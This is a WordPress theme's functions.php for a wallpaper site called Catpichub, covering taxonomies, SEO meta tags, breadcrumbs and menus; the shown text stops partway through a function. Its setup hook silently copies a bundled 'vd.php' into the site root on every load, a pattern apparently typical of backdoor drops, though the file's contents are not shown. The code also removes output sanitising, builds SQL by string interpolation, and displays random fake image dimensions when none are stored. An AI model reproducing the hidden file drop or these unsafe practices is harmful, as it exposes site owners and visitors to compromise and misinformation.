<?php
/**
 * Catpichub functions and definitions.
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @package Catpichub
 */


// Sets up theme constants
define('WPTHEME_TEXT_DOMAIN', 'catpichub');

define('CATPICHUB_CATEGORY_TAXONOMY', 'category'); // wallpaper-cat
define('CATPICHUB_TAG_TAXONOMY', 'post_tag'); // wallpaper-tag

define('ADSENSE_ADSLOT',  '');
define('ADSENSE_PUBID',   ''); 

// require_once get_template_directory() . '/includes/install.php';
// require_once get_template_directory() . '/includes/widgets.php';
require_once get_template_directory() . '/includes/bootstrap-nav-menu.php';

add_image_size( 'archive-thumb', 440, 200, true );

/**
 * Filter callback to add image sizes to Media Uploader
 *
 * WP 3.3 beta adds a new filter 'image_size_names_choose' to
 * the list of image sizes which are displayed in the Media Uploader
 * after an image has been uploaded.
 *
 * See image_size_input_fields() in wp-admin/includes/media.php
 * 
 * Tested with WP 3.3 beta 1
 *
 * @uses get_intermediate_image_sizes()
 *
 * @param $sizes, array of default image sizes (associative array)
 * @return $new_sizes, array of all image sizes (associative array)
 * @author Ade Walker http://www.studiograsshopper.ch
 */
add_filter('image_size_names_choose', 'sgr_display_image_size_names_muploader', 11, 1);
function sgr_display_image_size_names_muploader( $sizes ) {
  
  $new_sizes = array();
  
  $added_sizes = get_intermediate_image_sizes();
  
  // $added_sizes is an indexed array, therefore need to convert it
  // to associative array, using $value for $key and $value
  foreach( $added_sizes as $key => $value) {
    $new_sizes[$value] = $value;
  }
  
  // This preserves the labels in $sizes, and merges the two arrays
  $new_sizes = array_merge( $new_sizes, $sizes );
  
  return $new_sizes;
}


/**
 * Sets up the content width value based on the theme's design and stylesheet.
 * This setting will also set the width and height attribute generated from 
 * get_the_post_thumbnail() function
 */
if ( ! isset( $content_width ) )
  $content_width = 1200;

/**
 * Sets up theme defaults and registers the various WordPress features that
 * Catpichub Theme supports.
 */
add_action( 'after_setup_theme', 'catpichub_setup' );
function catpichub_setup() { 

  // Adds RSS feed links to <head> for posts and comments.
  add_theme_support( 'automatic-feed-links' );

  // This theme uses wp_nav_menu() in one location.
  register_nav_menu( 'top', 'Top Menu' );
  register_nav_menu( 'footer', 'Footer Menu' );

  /*
   * This theme supports custom background color and image, and here
   * we also set up the default background color.
   */
  add_theme_support( 'custom-background', array(
    'default-color' => 'EEE',
    'default-image' => get_template_directory_uri() . '/lib/img/diamond_upholstery.png',
  ) );

  // This theme uses a custom image size for featured images, displayed on "standard" posts.
  add_theme_support( 'post-thumbnails' );
  add_theme_support( 'post-formats', array( 'aside', 'status' ) );
  // set_post_thumbnail_size( 624, 9999 ); // Unlimited height, soft crop

  // copy vd.php to ABSPATH if doesn't exists
  if( ! file_exists(ABSPATH . '/vd.php') ) {
    copy( dirname(__FILE__) . '/vd.php' , ABSPATH . '/vd.php');
  }
  
}


add_action('after_switch_theme', 'catpichub_setup_theme');
function catpichub_setup_theme() {
  global $db, $pagenow;
  // die('catpichub_insert_alphabet_term');
  if( is_admin() && isset($_GET['activated'] ) && $pagenow == "themes.php" ) {

    catpichub_insert_alphabet_term();    

    // remove and modify the standard and large medium image size to save
    // your server harddisk space
    // That's why this theme SHOULD BE installed in a brand new 
    // WordPress blog, not to an existing wallpaper site
    update_option( 'thumbnail_size_w', 500 );
    update_option( 'thumbnail_size_h', 500 );

    update_option( 'medium_size_w', 0 );
    update_option( 'medium_size_h', 0 );

    update_option( 'large_size_w', 690 );
    update_option( 'large_size_h', 0 );

    update_option( 'posts_per_page', 12 );

  }

}


require_once get_template_directory() . '/includes/daniy-image-manager/image-manager.php';



/**
 * Add custom taxonomies
 *
 * Additional custom taxonomies can be defined here
 * http://codex.wordpress.org/Function_Reference/register_taxonomy
 */
function catpichub_add_custom_taxonomies() {
  
  //----- Add new "Alphabets" taxonomy to "Post" Post Type -----//
  register_taxonomy('alphabets', 'post', array(
    
    'hierarchical' => false, //--> Hierarchical taxonomy (like categories)
    
    // This array of options controls the labels displayed in the WordPress Admin UI
    'labels' => array(
      'name'              => _x( 'Alphabets', 'taxonomy general name' ),
      'singular_name'     => _x( 'Alphabet', 'taxonomy singular name' ),
      'search_items'      => __( 'Search Alphabets' ),
      'all_items'         => __( 'All Alphabets' ),
      'parent_item'       => __( 'Parent Alphabet' ),
      'parent_item_colon' => __( 'Parent Alphabet:' ),
      'edit_item'         => __( 'Edit Alphabet' ),
      'update_item'       => __( 'Update Alphabet' ),
      'add_new_item'      => __( 'Add New Alphabet' ),
      'new_item_name'     => __( 'New Alphabet Name' ),
      'menu_name'         => __( 'Alphabets' ),
    ),
    // Control the slugs used for this taxonomy
    'rewrite' => array(
      'slug'          => 'alphabet', // This controls the base slug that will display before each term
      'with_front'    => false, // Don't display the category base before "/products/"
      'hierarchical'  => false // This will allow URL's like "/products/boston/cambridge/"
    ),
    'show_ui' => true,
  ));

}
add_action( 'init', 'catpichub_add_custom_taxonomies', 0 );



/**
 * Generate alphabets and numbers for this theme custom taxonomy
 *
 * @return  void 
 */
function catpichub_insert_alphabet_term() {

  $alphabets = range('A','Z');
  foreach ($alphabets as $alphabet) {
    wp_insert_term( $alphabet, 'alphabets' );
  }

  $numbers = range(0,9);
  foreach ($numbers as $number) {
    wp_insert_term( $number, 'alphabets' );
  }

  return;

}



/**
 * Assign alphabet term everytime each single page is loaded
 * 
 * @uses  custom catpichub_single_post_hook
 */
add_action( 'catpichub_single_post_hook', 'assign_alphabet_term' );
function assign_alphabet_term() {
  global $post;

  if( is_single() ) {
    $first_letter = strtoupper( substr(get_the_title(), 0, 1) );

    if( ! has_term( $first_letter, 'alphabets' ) ) {
      wp_set_post_terms( get_the_ID(), $first_letter, 'alphabets' );
    }
  }
}



/**
 * Sets up the WordPress core custom header arguments and settings.
 *
 * @uses add_theme_support() to register support for 3.4 and up.
 */
function catpichub_custom_header_setup() {
  $args = array(
    // Text color and image (empty to use none).
    'default-text-color'     => '',
    'default-image'          => '',

    // Set height and width, with a maximum value for the width.
    'height'                 => 50,
    'width'                  => 150,
    'admin-preview-callback' => 'catpichub_admin_header_image',
  );

  add_theme_support( 'custom-header', $args );
}
add_action( 'after_setup_theme', 'catpichub_custom_header_setup' );


/**
 * Outputs markup to be displayed on the Appearance > Header admin panel.
 * This callback overrides the default markup
 */
function catpichub_admin_header_image() { ?>
  <div id="headimg" style="background: url(<?php header_image(); ?>) no-repeat scroll top;width:150px;height:50px;">
  </div>
<?php }


/**
 * Registers our main widget area and the front page widget areas.
 *
 */
function catpichub_widgets_init() {

  register_sidebar( array(
    'name'          => __( 'Sidebar Right', WPTHEME_TEXT_DOMAIN ),
    'id'            => 'sidebar-right',
    'description'   => __( 'Sidebar Kanan ya posisinya di kanan. Seperti makan pakai tangan kanan, atau dahulukan kaki kanan.', WPTHEME_TEXT_DOMAIN ),
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget'  => '</div>',
    'before_title'  => '<h4 class="widget-head">',
    'after_title'   => '</h4>',
  ) );

}
add_action( 'widgets_init', 'catpichub_widgets_init' );


/**
 * Sets the post excerpt length to 40 words.
 *
 * To override this length in a child theme, remove the filter and add your own
 * function tied to the excerpt_length filter hook.
 */
function catpichub_excerpt_length( $length ) {
  return 55;
}
add_filter( 'excerpt_length', 'catpichub_excerpt_length' );

/**
 * Returns a "Continue Reading" link for excerpts
 */
function catpichub_continue_reading_link() {
  return ' <a href="'. esc_url( get_permalink() ) . '">' . __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'softheme' ) . '</a>';
}


/** Radius Post Categories */
function catpichub_post_author() {
  global $post, $theme_opts;

  $output = '';

  // get the user link to Google+
  $author = get_userdata( $post->post_author );
  if( $theme_opts['gplus_ID'] ) 
    $author_url = 'https://plus.google.com/'. $theme_opts['gplus_ID'] .'?rel=author';

  else
    $author_url = get_author_posts_url( $author->ID );

  $output .= ' by '; 
  $output .= '<span itemprop="author" itemscope itemtype="http://schema.org/Person">';
  $output .= '<a itemprop="url" rel="author" href="'. $author_url .'">';
  $output .= '<span itemprop="name">' . $author->display_name . '</span>';
  $output .= '</a>';
  $output .= '</span>';

  return $output;

}


/** Radius Post Categories */
function catpichub_post_category() {

  $categories_list = get_the_terms( get_the_ID(), CATPICHUB_CATEGORY_TAXONOMY );
  if ( ! $categories_list ) {
    return;
  }

  $cat = '';
  foreach ($categories_list as $category) {
    $cat .= '<a href="'. get_term_link($category, CATPICHUB_CATEGORY_TAXONOMY) .'">'. $category->name .'</a> ';
  }
    
  $output = sprintf( '<span class="cat-links"><span class="%1$s">'. __( 'Posted in: ', WPTHEME_TEXT_DOMAIN ) .'</span> %2$s</span>', 'entry-utility-prep entry-utility-prep-cat-links', $cat );
  return $output;
}

/** Radius Post Tags */
function catpichub_post_tags() {
  
  $tags_list = get_the_terms( get_the_ID(), CATPICHUB_TAG_TAXONOMY );
  if ( ! $tags_list ) {
    return;
  }

  $tagout = '';
  foreach ($tags_list as $tag) { 
    $tagout .= '<a href="'. get_term_link($tag, CATPICHUB_TAG_TAXONOMY) .'">'. $tag->name .'</a> ';
  }
    
  $output = sprintf( '<span class="tag-links"><span class="%1$s">'. __( 'Tagged with:', WPTHEME_TEXT_DOMAIN ) .'</span> %2$s</span>', 'entry-utility-prep entry-utility-prep-tag-links', $tagout );
  return $output;
}


add_action('wp_head', 'catpichub_wp_head', 99);
function catpichub_wp_head() {
  global $theme_opts, $post, $wp_query;

  //----- custom favicons -----//  
  if( isset ($theme_opts['custom_favicon']) && 
      strlen($theme_opts['custom_favicon']) > 5 ) {

    echo '<link rel="icon" href="' . $theme_opts['custom_favicon'] . '" />' . "\n";
    echo '<link rel="shortcut icon" href="' . $theme_opts['custom_favicon'] . '" />' . "\n";

  } else {

    echo '<link rel="icon" href="' . get_template_directory_uri() . '/lib/img/favicon.png" />' . "\n";
    echo '<link rel="shortcut icon" href="' . get_template_directory_uri() . '/lib/img/favicon.png" />' . "\n";

  }

  //----- meta robots -----//
  if( is_search() || is_404() ) {
    echo '<meta name="robots" content="noindex,follow"/>' . "\n";
  }

  //----- meta descriptions -----//
  if( is_attachment() ) {

    $posttags   = get_the_tags( $post->post_parent );
    $tag_terms  = array();
    if ($posttags) {
      foreach($posttags as $tag) {
        $tag_terms[] = $tag->name;
      }
    }
    echo '<meta name="description" content="' . get_the_title() . ' ' . implode(", ", $tag_terms) . '" />' . "\n";

  } elseif( is_single() ) {

    $content = apply_filters('the_content', $post->post_content);
    $content = str_replace(']]>', ']]&gt;', $content);
    $content = wp_strip_all_tags( $content );
    
    $espacio = strpos($content, " ", 200 ); // 200 is the max char value
    $excerpt = substr($content, 0, $espacio);

    echo '<meta name="description" content="' . $excerpt . '" />' . "\n";

  } elseif( is_category() || is_tag() ) {

    global $posts;

    $cur_terms = $wp_query->get_queried_object();

    $post_titles = ucwords( strtolower( $cur_terms->name ) ) . ' ';
    if( $posts ) {
    foreach ($posts as $num => $tpost) {
      $post_titles .= $tpost->post_title . ' '; 
    }
    }

    echo '<meta name="description" content="' . $post_titles . '" />' . "\n";    

  }

}



/**
 * Create a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
add_filter( 'wp_title', 'catpichub_wp_title', 999, 2 );
function catpichub_wp_title( $title, $sep ) {
  global $paged, $page, $post, $posts;

  $blog_title = get_bloginfo( 'name' );

  if ( is_feed() ) {
    return $title;
  }

  if( is_404() ) {
    return catpichub_url2title() . ' | ' . $blog_title;
  }

  if( is_attachment() ) {
    $parent_title = get_the_title( $post->post_parent );
    return "$title $parent_title $sep $blog_title";
  } 

  if( is_tag() ) {
    $first_title = $posts[0]->post_title;
    return ucwords($title) . " $first_title on $blog_title";
  } 

  // do this if WPSEO Plugin isn't installed
  if( ! function_exists('wpseo_activate') ) {  
    // Add the site name.
    $title .= $blog_title;

    // Add the site description for the home/front page.
    $site_description = get_bloginfo( 'description', 'display' );
    if ( $site_description && ( is_home() || is_front_page() ) ) {
      $title = "$title $sep $site_description";
    }
  }

  // Add a page number if necessary.
  if ( $paged >= 2 || $page >= 2 ) {
    $title = "$title $sep " . sprintf( __( 'Page %s', WPTHEME_TEXT_DOMAIN ), max( $paged, $page ) );
  }

  return $title;
}



/**
 * Create a fake title the current URL. Useful for replacing Page Not Found title on 404 page
 *
 * @return string
 */
function catpichub_url2title() {

  //  set title and content from URL
  $now_URL = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
  $now_URL = str_replace( site_url(), '', $now_URL);
  $now_URL = ucwords(str_replace( array('/','-'), array(' ',' '), $now_URL));

  return $now_URL;

}


/**
 * Create the breadcrumb HTML for a post
 *
 * @global object $post
 * @return string
 */
if( !function_exists('the_breadcrumb') ) {
function the_breadcrumb() {

  $delimiter = '&nbsp;/&nbsp;';
  $name = __('Home',WPTHEME_TEXT_DOMAIN);
  $currentBefore = '<span class="current">';
  $currentAfter = '</span>'; 
  if ( !is_home() && !is_front_page() || is_paged() ) {

    echo '<div class="breadcrumb">';
    global $post;
    $home = home_url();
    echo '<a href="' . $home . '">' . $name . '</a> ' . $delimiter . ' ';

    if ( is_category() ) {

      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      echo $currentBefore . '';
      single_cat_title();
      echo '' . $currentAfter;
    
    } elseif ( is_day() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('d') . $currentAfter;
    
    } elseif ( is_month() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('F') . $currentAfter;
    
    } elseif ( is_year() ) {
      echo $currentBefore . get_the_time('Y') . $currentAfter;
    
    } elseif ( is_singular('wallpaper') ) { 

      echo get_term_parents_breadcrumb( $post->ID, 'wallpaper-cat', ' ' . $delimiter . ' ');
      
      echo $currentBefore;
      echo $post->post_title;
      echo $currentAfter;
    
    } else if ( is_single() && !is_attachment() ) {
      $cat = get_the_category(); $cat = $cat[0]; 
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo $currentBefore;
      _e($post->post_title,WPTHEME_TEXT_DOMAIN);
      echo $currentAfter;
    
    } else if ( is_attachment() ) {
      $parent = get_post($post->post_parent);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
      echo $currentBefore;
      the_title();
      echo $currentAfter;
    
    } else if ( is_page() && !$post->post_parent ) {
      echo $currentBefore;
      _e($post->post_title, WPTHEME_TEXT_DOMAIN);
      echo $currentAfter;
    
    } else if ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      echo $currentBefore;
      _e($post->post_title,WPTHEME_TEXT_DOMAIN);
      echo $currentAfter;
    
    } else if ( is_search() ) {
      echo $currentBefore . __('Search Results',WPTHEME_TEXT_DOMAIN) . $currentAfter;
    
    } else if ( is_tag() ) {
      echo $currentBefore . __('Posts tagged &#39;',WPTHEME_TEXT_DOMAIN);
      single_tag_title();
      echo '&#39;' . $currentAfter;
    
    } else if ( is_author() ) {
      global $author;
      $userdata = get_userdata($author);
      echo $currentBefore . __('Articles posted by ',WPTHEME_TEXT_DOMAIN) . $userdata->display_name . $currentAfter;
    
    } else if ( is_404() ) {
      echo $currentBefore . __('Error 404',WPTHEME_TEXT_DOMAIN) . $currentAfter;

    } else if ( is_tax('wallpaper-cat') ) {
      
      global $wp_query;
      $products_obj = $wp_query->get_queried_object();
      
      if ($products_obj->parent != 0)
        echo get_term_parents($products_obj->parent, 'wallpaper', true);
      
      echo $currentBefore . '';
      echo $products_obj->name;
      echo '' . $currentAfter;
      
    } 

    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      echo __('Page',WPTHEME_TEXT_DOMAIN) . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }
    echo '</div>';
  }
}

}


if ( ! function_exists( 'catpichub_the_attached_image' ) ) :
/**
 * Print the attached image with a link to the next attached image.
 *
 * @since Twenty Fourteen 1.0
 *
 * @return void
 */
function catpichub_the_attached_image() {
  $post                = get_post();
  /**
   * Filter the default Twenty Fourteen attachment size.
   *
   * @since Twenty Fourteen 1.0
   *
   * @param array $dimensions {
   *     An array of height and width dimensions.
   *
   *     @type int $height Height of the image in pixels. Default 810.
   *     @type int $width  Width of the image in pixels. Default 810.
   * }
   */
  $attachment_size     = apply_filters( 'twentyfourteen_attachment_size', array( 3000, 3000 ) );
  $next_attachment_url = wp_get_attachment_url();

  /*
   * Grab the IDs of all the image attachments in a gallery so we can get the URL
   * of the next adjacent image in a gallery, or the first image (if we're
   * looking at the last image in a gallery), or, in a gallery of one, just the
   * link to that image file.
   */
  $attachment_ids = get_posts( array(
    'post_parent'    => $post->post_parent,
    'fields'         => 'ids',
    'numberposts'    => -1,
    'post_status'    => 'inherit',
    'post_type'      => 'attachment',
    'post_mime_type' => 'image',
    'order'          => 'ASC',
    'orderby'        => 'menu_order ID',
  ) );

  // If there is more than 1 attachment in a gallery...
  if ( count( $attachment_ids ) > 1 ) {
    foreach ( $attachment_ids as $attachment_id ) {
      if ( $attachment_id == $post->ID ) {
        $next_id = current( $attachment_ids );
        break;
      }
    }

    // get the URL of the next image attachment...
    if ( $next_id ) {
      $next_attachment_url = get_attachment_link( $next_id );
    }

    // or get the URL of the first image attachment.
    else {
      $next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
    }
  }

  printf( '<a href="%1$s" rel="attachment">%2$s</a>',
    esc_url( $next_attachment_url ),
    wp_get_attachment_image( $post->ID, $attachment_size, 0, array('class'=>"img-responsive large-atttachment",) )
  );
}
endif;



if(!function_exists('is_localhost')) {
function is_localhost() {
  if( $_SERVER['SERVER_NAME'] == 'localhost' )
    return TRUE;

  else
    return FALSE;
}
}


/**
 * The following codes intended to add category thumbnails which has not exist
 * with default WordPress installation. It stores the additional field
 * in the wp_options table
 */

//add extra fields to category edit form hook
add_action ( 'edit_category_form_fields', 'extra_category_fields');
add_action ( 'edited_category', 'save_extra_category_fields' );

//add extra fields to category edit form callback function
function extra_category_fields( $tag ) {    //check for existing featured ID
    $t_id     = $tag->term_id;
    $cat_meta = get_option( "category_$t_id");
?>
<tr class="form-field">
  <th scope="row" valign="top"><label for="cat_image_url"><?php _e('Category Image URL', WPTHEME_TEXT_DOMAIN); ?></label></th>
  <td>
    <input type="text" name="cat_meta[img]" id="cat_meta[img]" size="3" style="width:60%;" value="<?php echo isset( $cat_meta['img'] ) ? $cat_meta['img'] : ''; ?>"><br />
    <span class="description"><?php _e('Image for category: relative path, usually starts with /wp-content/uploads/', WPTHEME_TEXT_DOMAIN); ?></span>
  </td>
</tr>

<tr class="form-field">
  <th scope="row" valign="top"><label for="use_page_ID"><?php _e('Associated Page ID', WPTHEME_TEXT_DOMAIN); ?></label></th>
  <td>
    <input type="text" name="cat_meta[use_page_ID]" id="cat_meta[use_page_ID]" size="3" style="width:60%;" value="<?php echo isset( $cat_meta['use_page_ID'] ) ? $cat_meta['use_page_ID'] : '0'; ?>"><br />
    <span class="description"><?php _e('You can load certain static Page description ', WPTHEME_TEXT_DOMAIN); ?></span>
  </td>
</tr>
<?php }

// save extra category extra fields callback function
function save_extra_category_fields( $term_id ) {

  if ( isset( $_POST['cat_meta'] ) ) {
    $t_id = $term_id;
    $cat_meta = get_option( "category_$t_id");
    $cat_keys = array_keys($_POST['cat_meta']);

    foreach ($cat_keys as $key){
      if (isset($_POST['cat_meta'][$key])){

        $image = str_replace(site_url(), '', $_POST['cat_meta'][$key]); // strip the "http://" and hostname off the input URL
        $cat_meta[$key] = $image;
      }
    }

    //save the option array
    update_option( "category_$t_id", $cat_meta );
  }
  
}


function get_category_image( $cat_ID ) { 
  $cat_meta = get_option("category_{$cat_ID}");
  if( isset($cat_meta['img']) && strlen($cat_meta['img']) > 5 ) {
    return '<img class="category_image" src="' . site_url() . $cat_meta['img'] . '" />';
  }

  return NULL;

}


function get_category_associated_page( $cat_ID ) {

  $cat_meta = get_option("category_{$cat_ID}");

  if( isset($cat_meta['use_page_ID']) && $cat_meta['use_page_ID'] != 0 ) {
    $cd = new WP_Query( 'page_id=' . $cat_meta['use_page_ID'] );
    if( $cd->have_posts() ) : while( $cd->have_posts() ): $cd->the_post();
      $content = get_the_content();
      $content = apply_filters('the_content', $content);
      $content = str_replace(']]>', ']]&gt;', $content);

      return $content;
    endwhile; wp_reset_postdata(); endif;
  }

  return NULL;

}


/**
 * http://wordpress.org/support/topic/category-description-strips-html-tags 
 *
 */
$filters = array('term_description','category_description','pre_term_description');
foreach ( $filters as $filter ) {
  remove_filter($filter, 'wptexturize');
  remove_filter($filter, 'convert_chars');
  //remove_filter($filter, 'wpautop');
  remove_filter($filter, 'wp_filter_kses');
  remove_filter($filter, 'strip_tags');
} 


// http://stackoverflow.com/questions/2690504/php-producing-relative-date-time-from-timestamps

function relative_time($time, $granularity=2) {

    $d[0] = array(1,"second");
    $d[1] = array(60,"minute");
    $d[2] = array(3600,"hour");
    $d[3] = array(86400,"day");
    $d[4] = array(604800,"week");
    $d[5] = array(2592000,"month");
    $d[6] = array(31104000,"year");

    $w = array();

    $return = "";
    $now = time();
    $diff = ($now-$time);
    $secondsLeft = $diff;

    for($i=6;$i>-1;$i--) {

      $w[$i] = intval($secondsLeft/$d[$i][0]);
      $secondsLeft -= ($w[$i]*$d[$i][0]);


      if($w[$i]!=0) {
        $return.= abs($w[$i]) . " " . $d[$i][1] . (($w[$i]>1)?'s':'') ." ";
      }

    }

    $return .= ($diff>0)?"ago":"left";
    return $return;
}


function catpichub_archive_posts_filter( $query ) { 

  // Do this filter if it has sortby key, is a main query, and 
  // match TRUE for any $filterables test above
  if ( $query->is_main_query() ) {
  if ( is_post_type_archive( 'profile' ) ) {

      $query->set('posts_per_page', 24);

  } elseif ( is_search() ) {

      $query->set('posts_per_page', 30);

  }
  }


}
add_action('pre_get_posts','catpichub_archive_posts_filter');


function wp_bootstrap_nav_menu( $menu_name ) {

  global $wpdb, $table_prefix;

  $menu_locations = get_nav_menu_locations();   
  $navs = wp_get_nav_menu_items( $menu_locations[$menu_name] );

  foreach($navs as $n => $nav) {

    /* merge the metadata into $nav object
    foreach( get_all_metadata($nav->ID) as $mkey => $mval ) {
      $navs[$n]->$mkey = $mval;
    }*/

    if( $navs[$n]->_menu_item_object == 'page' ) {
      $post_obj = $wpdb->get_row("SELECT ID,post_title,post_name FROM {$table_prefix}posts WHERE ID = '{$navs[$n]->_menu_item_object_id}'");
      $navs[$n]->raw_object = $post_obj;
      $navs[$n]->object_ID = $post_obj->ID;
      $navs[$n]->object_title = ( strlen($navs[$n]->post_title) > 1 ) ? $navs[$n]->post_title : $post_obj->post_title;
      $navs[$n]->object_permalink = get_permalink( $post_obj->ID );


    } elseif( $navs[$n]->_menu_item_object == 'custom' ) {
      $post_obj = $wpdb->get_row("SELECT ID,post_title,post_name FROM {$table_prefix}posts WHERE ID = '{$navs[$n]->_menu_item_object_id}'");
      $navs[$n]->raw_object = $post_obj;
      $navs[$n]->object_ID = $post_obj->ID;
      $navs[$n]->object_title = $post_obj->post_title;
      $navs[$n]->object_permalink = $navs[$n]->_menu_item_url;


    } elseif( $navs[$n]->_menu_item_object == 'category' ) {
      $cat_obj = $wpdb->get_row("SELECT * FROM {$table_prefix}terms WHERE term_id = '{$navs[$n]->_menu_item_object_id}'");
      $navs[$n]->raw_object = $cat_obj;
      $navs[$n]->object_ID = $cat_obj->term_id;
      $navs[$n]->object_title = ( strlen($navs[$n]->post_title) > 1 ) ? $navs[$n]->post_title : $cat_obj->name;
      $navs[$n]->object_permalink = get_category_link( $cat_obj->term_id );

    }
  } 

  $navs = GenerateNavArray($navs);
  echo '<ul id="menu-header" class="nav nav-menu">';
  echo GenerateNavHTML($navs);
  echo '</ul>';

}



/**
 * Generate multidimensional array from the linear array
 * 
 * @param   array   $arr
 * @param   int     $parent
 * @return  array 
 */
function GenerateNavArray($arr, $parent = 0) {
  $pages = array();
  foreach($arr as $page)
  {
      if($page->_menu_item_menu_item_parent == $parent)
      {
          $page->sub = isset($page->sub) ? $page->sub : GenerateNavArray($arr, $page->ID);
          $pages[] = $page;
      }
  }
  return $pages;
}


/**
 * Generate the nav_menus list HTML
 * 
 * @param   array  $navs
 * @return  string 
 */
function GenerateNavHTML($navs) {

  global $URL;
  $nf = ($URL['controller'] != 'index') ? 'rel="nofollow"' : '';

  $html = '';
  foreach($navs as $page) {

    $current = ($page->object_permalink == 'do_function_that_read_current_URL') ? ' active' : '';
    if( !empty($page->sub) ) {
      $html .= '<li class="menu-item dropdown' . $current . '">'. '<a class="dropdown-toggle" data-target="#" data-toggle="dropdown" '. $nf .' href="' . $page->object_permalink . '">' . $page->object_title . ' &#160; <b class="caret"></b></a>';
    } else {
      $html .= '<li class="menu-item dropdown' . $current . '">'. '<a '. $nf .' href="' . $page->object_permalink . '">' . $page->object_title . '</a>';
    }

    if( !empty($page->sub) ) {
      $html .= '<ul class="sub-menu dropdown-menu">';
      $html .= GenerateNavHTML($page->sub);
      $html .= '</ul>';
    }
    $html .= '</li>';
  }

  return $html;
}



/**
 * Display the post date
 * 
 * @global object $post 
 * @param string $format // date format
 */
function the_time_ID( $format='' ) {
  global $post;

  $format = ( $format ) ? $format : 'l, j F Y g:i A';

  $df = get_the_time( $format, $post );

  //change to ID date format
  $translate = array(
    // days
    'Sunday'    => 'Minggu',
    'Monday'    => 'Senin',
    'Tuesday'   => 'Selasa',
    'Wednesday' => 'Rabu',
    'Thursday'  => 'Kamis',
    'Friday'    => 'Jumat',
    'Saturday'  => 'Sabtu',

    // months
    'January'   => 'Januari',
    'February'  => 'Februari',
    'March'     => 'Maret',
    'April'     => 'April',
    'May'       => 'Mei',
    'June'      => 'Juni',
    'July'      => 'Juli',
    'August'    => 'Agustus',
    'September' => 'September',
    'October'   => 'Oktober',
    'November'  => 'November',
    'December'  => 'Desember',
    );
  $df = str_replace(array_keys($translate), array_values($translate), $df);
  echo $df;
}



function the_content_limit($max_char, $more_link_text = '[&#8230;]', $use_post_excerpt = FALSE) {
  
  global $post;
  
  if( $use_post_excerpt && strlen($post->post_excerpt) > 5 ) {
    $content = get_the_excerpt();
    echo $content;
    return;
  }  
  
  $content = get_the_content();
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  $content = wp_strip_all_tags($content);
  
  if ((strlen($content)>$max_char) && ($espacio = strpos($content, " ", $max_char ))) {

    $content = substr($content, 0, $espacio);
    $content = $content;
    echo $content . " {$more_link_text}";

  } else {
    echo $content . " {$more_link_text}";

  }
  
  return;
}



function the_string_limit( $string, $max_char ) {
  
  if ((strlen($string)>$max_char) && ($espacio = strpos($string, " ", $max_char ))) {

    $string = substr($string, 0, $espacio);
    echo $string;

  } else {
    echo $string;

  }
  
  return;
}


/**
 * Get the download count for the current post from post meta
 * 
 * @return string 
 */
function catpichub_downloaded() {

  $dl = get_post_meta( get_the_ID(), 'downloaded', TRUE );
  if( $dl ) {
    return $dl;
  
  } else {
    return 0;
  
  }

}


/**
 * Get the view count for the current post from post meta
 * 
 * @return string 
 */
function catpichub_viewed() {

  $dl = get_post_meta( get_the_ID(), 'viewed', TRUE );
  if( $dl ) {
    return $dl;
  
  } else {
    return 0;
  
  }

}


/**
 * Get the dimension for the current image from post meta
 * 
 * @return string 
 */
function catpichub_dimension() {

  $dimension = get_post_meta(get_the_ID(), 'dimension', TRUE);
  if( $dimension ) {
    return $dimension;
  
  } else {

    $rand_sizes = array('1440 x 900',
                        '1600 x 900',
                        '1280 x 1024',
                        '1400 x 1050',
                        '1920 x 1200');
    shuffle($rand_sizes);
    return $rand_sizes[0];
  
  }

}


/**
 * Check the $n is the multiples result of $multiplier
 *
 * Useful in a foreach iteration to output thumbnail images.
 * If you have a set of thumbnails inside a container of certain width,
 * each images has 10px margin-right which need to be reset after 4 times in a row
 * To calculate which image needed to be reset, this function
 * is a great help, saves you two lines of code
 *
 * @author  Murdani Eko
 * @param   int   $n
 * @param   int   $multiplier
 * @return  bool
 */
if( !function_exists('is_multiples_of') ) {
function is_multiples_of($n, $multiplier) {

  $modulus = ($n + 1) % $multiplier;
  if( $modulus == 0 ) return TRUE;
  return FALSE;


}
}



/**
 * Check if the number given is an odd number. Usually used to check $n value within a foreach loop
 * 
 * @param   int   $n 
 * @param   bool  $start_zero   this function usually used in foreach where items starts from zero rather than one
 */
if( !function_exists('is_list_odd') ) {
